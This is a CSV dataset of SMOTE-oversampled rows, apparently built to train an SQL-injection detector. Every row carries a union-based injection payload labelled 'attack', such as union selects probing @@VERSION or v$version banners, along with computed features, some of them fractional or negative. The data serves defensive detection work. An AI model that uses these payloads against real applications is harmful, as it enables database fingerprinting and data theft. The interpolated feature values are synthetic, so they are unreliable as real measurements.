id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000426,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000113,0.10767552682202884,103.22891623545488,28.0,4.038108441546721,29.0,43.3831329883639,15.0,15.845783247090974,0.281133534080586,0.4199850160014148,0.14541389693823412,0.15346755297976508,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.845783247090974,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000427,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000079,1.1718995962509424,40.58740541258662,20.162483308103518,3.9219692902182564,19.037427668448586,8.0,9.16248330810352,4.3874944360345065,0.4573522865922949,0.20490239717376418,0.22769618752873516,0.11004912870520575,0.38749443603450673,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,3.0,0.38749443603450673,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000428,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000021,1.2411456777907302,75.31559716664545,31.631194333290892,4.373915412637884,44.737611333418215,2.3155971666454462,17.0,11.262388666581787,0.594176031638715,0.030708525116687313,0.2257254119591276,0.1493900312854701,0.94679149993634,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.3155971666454466,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000429,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000030,0.6341197218370067,97.88639785218447,26.11360214781553,3.6700916592286177,42.795215034708704,4.772795704368939,36.54559140873788,13.772795704368942,0.43727144578263255,0.04873784870263348,0.37330856696039205,0.14068213855434186,2.6591935565534124,0.11360214781552921,2.0,0.0,1.0,1.8863978521844706,0.0,4.0,0.0,0.0,1.0,4.886397852184471,0.8863978521844706,0.11360214781552924,1.0,0.11360214781552927,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000430,attack,union," select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000033,0.3958064500922183,109.34739309856923,28.0,3.9938535563484594,62.463190798092306,4.0,31.115797699523075,11.768404600953849,0.5711786881455414,0.03658342296901401,0.28455543604131467,0.10768245284412997,2.652606901430773,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,1.0,5.115797699523076,0.8842023004769244,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000431,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000142,0.6329856939871643,84.23290368110682,22.37670963188932,3.6946783151219895,14.0,40.98632294488545,14.0,15.246580736221363,0.1667743806038031,0.485511168004257,0.16677438060380312,0.1809400707881368,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,1.0,0.0,8.246580736221363,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000117,0.38141333227094537,82.42311785670786,26.257688214329214,3.999111037431877,25.0,25.938494285366296,22.0,9.484623571341574,0.3042230672285966,0.3132430924342454,0.267716299161165,0.11481754117599295,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,2.484623571341574,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000433,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000025,0.08456648874736762,75.0,32.0,4.396529272887047,44.0,2.024760058233234,17.0,11.975239941766764,0.5866666666666667,0.02699680077644312,0.22666666666666666,0.15966986589022353,0.0,0.0,2.0,0.0,1.975239941766765,1.0,0.0,-1.1102230246251565e-16,0.024760058233235016,0.0,1.0,6.975239941766764,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000434,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,0.28363494712591636,69.93230433761443,24.475692754984742,4.173841827226574,27.0,23.14584347009154,11.0,8.786460867522885,0.3892307861736645,0.32715667457421493,0.15857550547815963,0.12503703377396092,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,3.786460867522885,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,0.6826064645553559,75.37606223985863,27.792020746619542,4.165129090577911,26.056027662159387,25.056027662159387,15.735993084460153,8.528013831079694,0.34542072558322245,0.3321190320048494,0.20960750072299586,0.11285274168893228,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.264006915539847,4.264006915539847,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.2640069155398468,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.264006915539847
SMOTE_000436,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000067,0.32876335357060577,87.32194321899452,29.464388643798905,4.303108180742716,37.0,21.857554575195618,17.0,11.464388643798904,0.42465487317612416,0.24909638074448753,0.19511169848632734,0.13113704759306097,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.464388643798904,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000437,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000133,0.15596808591957106,88.80265907909742,28.0,4.250807190070643,29.0,31.042127263277944,15.0,13.760531815819487,0.32736635358609995,0.348460201950207,0.16932742426867237,0.1548460201950207,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.760531815819486,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000438,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000085,0.006429430392827549,59.953270499748086,19.0,3.599125550632781,14.0,31.96261639979847,4.0,9.990654099949618,0.23353157969803845,0.5331067660593847,0.06672330848515384,0.16663834575742306,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.990654099949617,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000439,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000010,0.4278055558047912,102.91685294128003,27.083147058719977,4.125963768307225,62.0,4.91685294128002,23.916852941280023,12.083147058719977,0.6024324307672414,0.047768093303392545,0.23238448337722462,0.11741499255214138,3.0,0.16629411743995381,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.916852941280023,1.0,0.08314705871997699,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.916852941280023,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000440,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000016,0.02048543789482599,101.99106349354423,27.991063493544225,4.176004368850577,62.004468253227884,4.0,23.0,12.986595240316337,0.6079421397283825,0.03921919078684544,0.22551034702436107,0.12732832246041093,3.0,1.9910634935442255,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.995531746772112,1.0,0.9955317467721126,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000441,attack,union,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",nearest_attack_euclidean,R000075,0.8901545954723018,99.64166382222372,27.0,3.908750405530389,25.0,42.21388794074124,19.32083191111186,13.106943970370619,0.2518134566763346,0.4239861777368138,0.19278758285487183,0.13141278273197982,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.5534719851853096,0.0,0.0,6.553471985185309,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000442,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000131,0.1216675373743091,80.27291256727207,23.09694499103039,3.93904825884498,27.0,31.418330053817655,11.0,10.854582513454414,0.3370054920844845,0.3906007355418114,0.13729853381219737,0.13509523856150668,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,5.854582513454414,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000443,attack,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",nearest_attack_euclidean,R000144,0.6224359445825396,60.806303088491646,22.707507078465554,3.8708142610011853,14.0,18.830028313862215,17.415014156931107,10.56126061769833,0.23237822644216827,0.3075944847895127,0.28658480036170964,0.17344248840660934,0.14624646076722359,0.8537535392327765,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.8537535392327764,1.0,0.0,2.7075070784655533,3.0,0.14624646076722347,0.8537535392327765,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000444,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000030,0.41296076338329796,96.99299589772428,26.14385772889653,3.680605016774274,42.0,4.856142271103469,36.13685362662081,14.0,0.43370920460344753,0.049919456156404085,0.37180160437233245,0.14456973486781585,3.0,0.14385772889653126,2.0,0.0,1.0,1.9280711355517344,0.0,3.8561422711034687,0.0,0.0,1.0,5.0,1.0,0.07192886444826563,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000445,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.3166579202268824,43.21177092066299,18.3576458158674,3.830633596253923,14.0,18.569416736530393,4.0,6.642354184132599,0.3250195595059545,0.42854907485033766,0.09286273128741557,0.1535686343562922,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,2.642354184132598,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000446,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000023,0.3991485337315069,103.63575275428506,26.0,4.062546547023004,65.27150550857013,3.3642472457149317,24.817876377142532,10.182123622857468,0.6297395259340572,0.03252021637363289,0.23945751549450384,0.098282742197806,3.0,0.0,2.0,0.0,1.1821236228574672,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.182123622857468,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000447,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,0.7182551711894003,100.26690646747133,26.0,4.044025856275216,62.0,5.0,24.266906467471323,9.0,0.618361564259087,0.04986786808541027,0.2420084051017644,0.08976216255373842,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.7330935325286787,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000448,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000013,0.8655659161585296,95.00422750114802,27.153520961450152,3.8038612090359964,47.92535326984894,3.0,31.771832308398785,12.307041922900304,0.5043632940131435,0.03166265555922387,0.33366816720382886,0.1303058832238038,0.4605628843504559,1.1535209614501518,2.0,0.0,1.0,1.0,0.0,3.6929580770996964,0.0,0.0,1.0,4.153520961450152,0.15352096145015193,1.0,1.0,0.8464790385498481,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000449,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000150,0.4661182969446289,84.50700092337036,28.10140018467407,4.211586972414841,29.0,28.405600738696283,15.0,12.10140018467407,0.3443744806175878,0.33450070206174337,0.17812473135392473,0.14300008596674407,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.1014001846740706,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000450,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R000114,0.49596955027138906,75.51354192771511,23.0,3.865456775510236,14.0,33.34777805622945,14.663055485942637,13.502708385543023,0.18657110561904527,0.4376555105795998,0.197095795872103,0.17867758792925198,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.1657638714856593,1.0,0.0,6.336944514057363,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000451,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000048,0.45228026179454295,80.62633287577106,28.0,4.206140560529672,29.0,24.50106630061684,15.0,12.12526657515421,0.3610723680945317,0.3019691474558184,0.18676156970406813,0.15019691474558183,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.1252665751542104,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000452,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.3342663342253629,46.8790016493572,19.0,3.7904129088066028,14.0,21.503201319485758,4.0,7.375800329871439,0.306224534958636,0.45002910290441595,0.08749272427389601,0.156253637863052,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,3.37580032987144,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000453,attack,union," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,0.28400128626102344,100.16344212413179,25.918278937934105,4.067260656583278,62.326884248263575,5.836557875868213,23.081721062065895,8.918278937934106,0.6222112757970771,0.05830148380804223,0.23043264091681945,0.08905459947806124,0.0,0.0,2.0,0.0,1.0817210620658937,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.918278937934106,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9182789379341062,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000454,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000025,0.03528269135758809,75.0,31.869788299015212,4.3933061749742945,44.0,2.0,17.0,12.0,0.5866666666666667,0.026666666666666672,0.22666666666666666,0.16,0.0,0.0,2.0,0.0,2.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000455,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000134,0.1189516529501826,115.95149155430717,30.0,4.307784936858705,37.0,44.76119324344573,17.0,17.190298310861433,0.31929007391239195,0.3857858500595996,0.1467008447705585,0.14822323125744996,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.190298310861433,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000456,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.12169299300196221,76.0,33.45010545935829,4.451837982608943,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000457,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000027,1.6858739404357614e-07,76.0,34.0,4.466308891573198,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
